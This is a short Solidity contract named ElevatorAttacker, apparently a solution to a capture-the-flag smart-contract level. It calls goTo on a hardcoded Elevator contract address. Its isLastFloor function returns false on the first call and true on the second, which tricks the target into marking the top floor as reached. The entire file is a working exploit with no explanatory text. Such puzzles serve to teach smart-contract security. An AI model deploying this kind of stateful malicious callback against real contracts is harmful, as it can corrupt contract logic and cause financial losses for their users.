pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint _floor) external payable;
}

contract ElevatorAttacker {
  Elevator public elevatorContract = Elevator(0x3f036C22b2625EB919E3620E39D48195545635Ac); 
  bool public switchFlipped = false; 
  
  function goTo() public {
    elevatorContract.goTo(1);
  }
  
  function isLastFloor(uint) public returns (bool) {
    if (!switchFlipped) {
      switchFlipped = true;
      return false;
    } else {
      switchFlipped = false;
      return true;
    }
  }
}